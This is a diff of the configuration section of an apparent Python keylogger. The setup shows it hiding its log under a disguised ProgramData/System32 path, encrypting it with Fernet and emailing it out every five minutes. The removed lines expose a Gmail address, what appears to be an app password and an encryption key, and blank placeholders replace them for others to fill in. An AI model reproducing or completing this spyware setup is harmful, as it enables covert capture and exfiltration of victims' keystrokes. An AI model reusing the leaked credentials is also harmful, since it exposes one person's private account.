@@ -6,14 +6,16 @@ import threading
 import os
 
 # === CONFIGURATION ===
-log_file = "C:/ProgramData/System32/klog.txt"  # Hidden location
+#location of the hidden file of 
+log_file = ""  # Hidden location
 email_interval = 300  # Send email every 5 minutes (in seconds)
-
-EMAIL_ADDRESS = "naveengulgi2003@gmail.com"
-EMAIL_PASSWORD = "invl xpuv dtxf spkq"
+#your mail id
+EMAIL_ADDRESS = ""
+#setup any two factor auth password
+EMAIL_PASSWORD = ""
 
 # === ENCRYPTION SETUP ===
-key = b'7lGUTamn1KkNneBvSkvLvo_1T5TZrXgh592pFiarJOc='  # Replace with your actual key
+key = b''  # Replace with your actual key
 cipher = Fernet(key)
 
 # === LOGGING FUNCTION ===
